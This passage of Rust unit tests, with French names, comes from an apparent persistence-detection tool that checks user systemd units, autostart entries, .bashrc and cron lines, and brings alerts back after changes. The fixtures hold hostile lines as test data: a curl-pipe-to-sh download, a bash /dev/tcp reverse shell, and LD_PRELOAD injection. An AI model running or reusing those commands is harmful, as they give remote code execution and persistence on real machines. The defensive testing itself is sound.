        let Temoins::Releves(_) = c.temoins() else {
            panic!("{:?}", c.temoins());
        };
        let lignes = c.temoins().lignes();
        assert_eq!(lignes.len(), 1);
        assert_eq!(lignes[0].ou, "~/.config/systemd/user/rappel.service:6");
        assert_eq!(lignes[0].ligne, "ExecStart=%h/.cache-x/rappel.sh");
        assert!(lignes[0].contenant.is_some());
        assert_eq!(lignes[0].cibles.len(), 1);
        assert_eq!(lignes[0].cibles[0].0, "~/.cache-x/rappel.sh");
        assert!(crate::apprentissage::declarable(&c).is_ok());
        let encore = m.lancements();
        assert_eq!(c.temoins().empreinte(), encore.temoins().empreinte());
        assert!(crate::apprentissage::essai_tait(&c, &encore));
    }

    /// Le modèle de menace du lot, cas par cas : après un choix « normal », chaque changement fait revenir l'alerte.
    #[test]
    fn tout_changement_fait_revenir_l_alerte() {
        type Changement = fn(&Maison);
        let cas: [(&str, Changement); 9] = [
            ("unité changée", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}Environment=LD_LIBRARY_PATH=/tmp\n"),
                );
            }),
            ("unité remplacée par un lien au même contenu", |m| {
                m.ecrire(".local/share/ailleurs.service", UNITE);
                let p = m.chemin(".config/systemd/user/rappel.service");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".local/share/ailleurs.service"), &p).unwrap();
            }),
            ("programme lancé changé", |m| {
                m.ecrire(".cache-x/rappel.sh", "#!/bin/sh\ncurl -s http://192.0.2.7/x | sh\n");
            }),
            ("programme lancé remplacé par un lien", |m| {
                m.ecrire(".cache-x/vrai.sh", "#!/bin/sh\necho rappel\n");
                let p = m.chemin(".cache-x/rappel.sh");
                std::fs::remove_file(&p).unwrap();
                std::os::unix::fs::symlink(m.chemin(".cache-x/vrai.sh"), &p).unwrap();
            }),
            ("programme lancé effacé", |m| {
                std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
            }),
            ("ligne ajoutée dans le même fichier", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &format!("{UNITE}ExecStartPost=%h/.cache-x/autre.sh\n"),
                );
            }),
            ("autre source dans la même alerte", |m| {
                m.ecrire(".config/autostart/maj.desktop", "[Desktop Entry]\nExec=/tmp/.x/agent\n");
            }),
            ("ligne de la crontab dans un fichier lu", |m| {
                m.ecrire(".bashrc", "export LD_PRELOAD=/tmp/.l/libz.so\n");
            }),
            ("même ligne, autre programme", |m| {
                m.ecrire(
                    ".config/systemd/user/rappel.service",
                    &UNITE.replace("rappel.sh", "rappel.sh --x"),
                );
            }),
        ];
        for (nom, changer) in cas {
            let m = maison_avec_rappel(&format!("revient-{}", nom.len()));
            let declare = m.lancements();
            assert!(crate::apprentissage::essai_tait(&declare, &m.lancements()), "{nom}");
            changer(&m);
            let plus_tard = m.lancements();
            assert!(plus_tard.probleme >= Some(Niveau::Eleve), "{nom}");
            assert_ne!(declare.temoins().empreinte(), plus_tard.temoins().empreinte(), "{nom}");
            assert!(
                !crate::apprentissage::essai_tait(&declare, &plus_tard),
                "{nom} : l'alerte doit revenir"
            );
        }
    }

    /// Ce qui ne se relève pas ne se déclare pas normal : une commande ambiguë, un programme illisible, plus de
    /// lignes qu'on n'en montre ; un shell inversé non plus. Et une alerte qui ne se relève plus n'est plus tue.
    #[test]
    fn releves_refuses() {
        use crate::machine::temoins::{TEMOINS_MAX, Temoins};
        let refuse = |m: &Maison| matches!(m.lancements().temoins(), Temoins::Refuse(_));
        let m = Maison::nouvelle("ambigu");
        m.ecrire(
            ".config/systemd/user/a.service",
            "[Service]\nExecStart=%h/.x/run $ARGUMENTS\n",
        );
        assert!(refuse(&m));
        assert!(crate::apprentissage::declarable(&m.lancements()).is_err());
        let m = Maison::nouvelle("inverse");
        m.ecrire(".bashrc", "bash -i >& /dev/tcp/192.0.2.7/4444 0>&1\n");
        assert!(refuse(&m));
        let m = Maison::nouvelle("trop");
        let unite = (0..=TEMOINS_MAX).fold(String::new(), |mut u, i| {
            u.push_str("ExecStartPre=%h/.x/etape");
            u.push_str(&i.to_string());
            u.push('\n');
            u
        });
        m.ecrire(".config/systemd/user/a.service", &format!("[Service]\n{unite}"));
        assert!(refuse(&m));
        // Le programme devenu illisible (un dossier à sa place) : le choix d'hier ne tait plus rien.
        let m = maison_avec_rappel("illisible");
        let declare = m.lancements();
        std::fs::remove_file(m.chemin(".cache-x/rappel.sh")).unwrap();
        std::fs::create_dir_all(m.chemin(".cache-x/rappel.sh")).unwrap();
        let plus_tard = m.lancements();
        assert!(matches!(plus_tard.temoins(), Temoins::Refuse(_)));
        assert!(!crate::apprentissage::essai_tait(&declare, &plus_tard));
    }

    /// Une ligne de cron se lit sans son horaire ni le compte qui la lance.
    #[test]
    fn commandes_de_cron() {
        assert_eq!(commande_de_cron("*/5 * * * * /opt/a --b", false), "/opt/a --b");
        assert_eq!(commande_de_cron("@reboot /opt/a", false), "/opt/a");
        assert_eq!(commande_de_cron("0 3 * * * root /opt/a", true), "/opt/a");
        assert_eq!(commande_de_cron("@daily root /opt/a", true), "/opt/a");
    }
}
